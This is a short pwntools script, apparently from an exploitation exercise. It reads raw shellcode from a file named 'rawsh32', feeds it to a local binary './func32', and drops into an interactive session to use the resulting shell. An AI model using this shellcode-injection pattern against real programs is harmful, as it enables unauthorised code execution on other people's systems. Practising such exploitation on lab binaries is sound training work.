from pwn import *
f = open("rawsh32",'r')
s = f.read()

p = process("./func32")
p.sendline(s)
p.interactive()

